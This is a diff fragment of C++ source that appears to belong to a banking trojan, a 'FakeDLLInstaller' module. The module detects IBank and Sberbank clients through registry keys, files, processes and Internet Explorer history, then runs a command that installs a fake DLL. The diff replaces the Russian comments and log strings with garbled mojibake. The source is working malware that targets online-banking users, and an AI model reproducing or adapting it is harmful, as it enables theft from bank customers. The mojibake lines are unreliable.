+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+		// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IBank
+        FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
-		// Проверяем наличие файла
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		string FileNameName = GetSpecialFolderPathA(CSIDL_PROFILE, GetStr(EStrIBankFileName));
 
 		bool Result = File::IsExists(FileNameName.t_str());
@@ -743,9 +754,9 @@ namespace FDI
 
 		if (!Result)
 		{
-			// Проверяем реестр
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-			FKIDBG("FakeDLLInstaller", "Проверяем ключи реестра");
+			FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			string Tmp = GetStr(EStrSberRegistryKey);
 
 			Result = Registry::IsKeyExist(HKEY_LOCAL_MACHINE, GetStr(EStrIBankRegistryPath).t_str()) ||
@@ -755,8 +766,8 @@ namespace FDI
 
 		if (Result)
 		{
-			FKIDBG("FakeDLLInstaller", "Найдено присутствие ИБанка");
-			// При включенном фва патчере запускаем установку
+			FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
+			// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			#ifdef JAVS_PATCHERHvd
 				JavaPatcherSignal(NULL);
 			#endif
@@ -769,11 +780,11 @@ namespace FDI
 
 	void CheckFile(PFindData Find, PCHAR FileName, LPVOID SearchData, bool &Cancel)
 	{
-		// Проверяем файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		DWORD Hash = STRA::Hash(Find->cFileName, 0, true);
 		if (CheckFileHash(Hash))
 		{
-			FKIDBG("FakeDLLInstaller", "Найден файл %s", FileName);
+			FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ %s", FileName);
 			Cancel = true;
             *((bool*)SearchData) = true;
 		}
@@ -783,8 +794,8 @@ namespace FDI
 
 	bool CheckFiles()
 	{
-		// Функция ищет вхождение нужных файлов
-		FKIDBG("FakeDLLInstaller", "Проверяем файлы на диске");
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 		TMemory Path(MAX_PATH);
 
 		pGetSystemDirectoryA(Path.AsStr(), MAX_PATH);
@@ -800,38 +811,38 @@ namespace FDI
 	}
 
 	//--------------------------------------------------
-	//  Функция потока анализа истории навигации
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	//--------------------------------------------------
 	DWORD WINAPI DoExecute(LPVOID)
 	{
-		// В данны момент в эту часть вставляем проверку
-		// ключей реестра сигнализирующих об установленном,
-		// на машине пользователя IBank
+		// пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+		// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IBank
 
-        FKIDBG("FakeDLLInstaller", "Определяем необхдимость установки FakeDll");
+        FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FakeDll");
 
 		bool Executed = IBankInstalled() ||
 						SearchProcesses();
 
-		// Проверяем историю навигации ие
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
 		if (!Executed)
 		{
 			TBotStrings Links;
 
-			// Читаем ссылки
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			ReadLinks(Links);
 
-			// Анализируем историю навигации
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			Executed = CheckIEHistory(Links);
 		}
 
 
-		// Последним этапом ищем файлы на диске
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (!Executed)
 			Executed = CheckFiles();
 
 
-		// В случае обнаружения вхождений, выполняем команду
+		// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Executed)
 		{
         	Install();
@@ -845,24 +856,24 @@ namespace FDI
 
 
 //------------------------------------------------------
-// Execute - Фуекция запускает анализ истории навигации
+// Execute - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 void FDI::Execute()
 {
 	if (!BOT::FakeDllInstalled())
 		StartThread(DoExecute, 0);
 	else
-		FKIDBG("FakeDLLInstaller", "Fake DLL уже установлена");
+		FKIDBG("FakeDLLInstaller", "Fake DLL пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 }
 
 
 
 //------------------------------------------------------
-//  Функция запускает установку Fake DLL
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Fake DLL
 //------------------------------------------------------
 void FDI::Install()
 {
-	FKIDBG("FakeDLLInstaller", "Устанавливаем Fake DLL");
+	FKIDBG("FakeDLLInstaller", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Fake DLL");
 	#ifndef AGENTFULLTEST
 		ExecuteCommand(NULL, GetStr(EStrCommandInstallFakeDLL).t_str(), NULL , false);
 	#endif
